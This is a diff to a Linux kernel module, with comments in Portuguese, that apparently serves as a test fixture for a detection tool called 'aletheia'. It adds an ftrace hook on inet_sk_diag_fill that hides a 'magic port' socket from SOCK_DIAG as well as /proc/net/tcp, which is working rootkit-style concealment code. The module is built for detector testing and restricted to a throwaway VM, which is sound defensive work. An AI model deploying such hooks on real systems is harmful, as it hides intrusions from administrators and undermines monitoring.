@@ -13,6 +13,13 @@
 //   2. hooka tcp4_seq_show por ftrace e faz a linha da porta mágica sumir. O
 //      inet_diag NÃO passa por tcp4_seq_show, então a porta continua lá — e é
 //      esta a divergência que o cross.socket_view existe para pegar.
+//   3. com esconder=2, hooka TAMBÉM inet_sk_diag_fill e esconde o socket do
+//      SOCK_DIAG. Agora as DUAS fontes concordam (as duas mentem igual), e o
+//      cross.socket_view NÃO tem divergência para achar — é o ponto cego real
+//      da comparação. A pergunta que este modo faz é OUTRA: a aletheia ainda
+//      produz ALGUM sinal independente? Sim — os dois hooks de ftrace aparecem
+//      em enabled_functions, e o kernel.ftrace_hook os pega. O mecanismo do
+//      ataque é visível mesmo quando o efeito dele não é.
 //
 // SEGURANÇA: este .ko só deve ser CARREGADO dentro da VM descartável que o
 // script sobe. Nunca com insmod no host nem em contêiner — em contêiner o
@@ -28,6 +35,8 @@
 #include <linux/inet.h>
 #include <linux/seq_file.h>
 #include <net/sock.h>
+#include <linux/inet_diag.h>
+#include <linux/netlink.h>
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("prova de que o inet_diag ve conexao escondida de /proc/net/tcp - aletheia");
@@ -94,7 +103,66 @@ static asmlinkage int hooked_show(struct seq_file *seq, void *v)
 	return r;
 }
 
+// --- hook do inet_sk_diag_fill: esconde o socket do SOCK_DIAG ---
+//
+// inet_sk_diag_fill preenche UMA mensagem netlink por socket durante o dump. O
+// primeiro argumento é `struct sock *sk` (em rdi no x86_64), e o chamador no
+// caminho de LISTEN trata retorno < 0 como erro e aborta; retornar 0 SEM
+// preencher faz o socket simplesmente não aparecer, e o dump segue para o
+// próximo. É o hide limpo, análogo ao do seq_show.
+static asmlinkage int (*real_fill)(struct sock *, struct inet_connection_sock *,
+	struct sk_buff *, struct netlink_callback *, const void *, u16, bool);
+static DEFINE_PER_CPU(int, dentro_fill);
+
+static asmlinkage int hooked_fill(struct sock *sk, struct inet_connection_sock *icsk,
+	struct sk_buff *skb, struct netlink_callback *cb, const void *req,
+	u16 flags, bool net_admin)
+{
+	int r;
+	if (sk && sk->sk_num == PORTA_MAGICA)
+		return 0; // some do SOCK_DIAG: mensagem netlink não é emitida
+	preempt_disable();
+	this_cpu_write(dentro_fill, 1);
+	r = real_fill(sk, icsk, skb, cb, req, flags, net_admin);
+	this_cpu_write(dentro_fill, 0);
+	preempt_enable();
+	return r;
+}
+
 static struct ftrace_ops ops;
+static struct ftrace_ops ops_fill;
+
+static void notrace thunk_fill(unsigned long ip, unsigned long parent_ip,
+			  struct ftrace_ops *o, struct ftrace_regs *fregs)
+{
+	struct pt_regs *regs;
+	if (this_cpu_read(dentro_fill))
+		return;
+	regs = ftrace_get_regs(fregs);
+	regs->ip = (unsigned long)hooked_fill;
+}
+
+static int instalar_hook_fill(void)
+{
+	unsigned long alvo = kln("inet_sk_diag_fill");
+	if (!alvo) {
+		pr_err("socket-hidden: inet_sk_diag_fill não resolvido\n");
+		return -1;
+	}
+	real_fill = (void *)alvo;
+	ops_fill.func = thunk_fill;
+	ops_fill.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+	if (ftrace_set_filter_ip(&ops_fill, alvo, 0, 0)) {
+		pr_err("socket-hidden: ftrace_set_filter_ip (fill) falhou\n");
+		return -1;
+	}
+	if (register_ftrace_function(&ops_fill)) {
+		pr_err("socket-hidden: register_ftrace_function (fill) falhou\n");
+		ftrace_set_filter_ip(&ops_fill, alvo, 1, 0);
+		return -1;
+	}
+	return 0;
+}
 
 static void notrace thunk(unsigned long ip, unsigned long parent_ip,
 			  struct ftrace_ops *o, struct ftrace_regs *fregs)
@@ -166,11 +234,21 @@ static int __init evil_init(void)
 		}
 		pr_info("socket-hidden: porta %d escondida de /proc/net/tcp\n", PORTA_MAGICA);
 	}
+	if (esconder >= 2) {
+		if (instalar_hook_fill()) {
+			pr_err("socket-hidden: hook do SOCK_DIAG falhou\n");
+			// não desfaz o resto: o modo 1 continua válido
+		} else {
+			pr_info("socket-hidden: porta %d escondida TAMBÉM do SOCK_DIAG\n", PORTA_MAGICA);
+		}
+	}
 	return 0;
 }
 
 static void __exit evil_exit(void)
 {
+	if (ops_fill.func)
+		unregister_ftrace_function(&ops_fill);
 	if (ops.func)
 		unregister_ftrace_function(&ops);
 	if (listener)
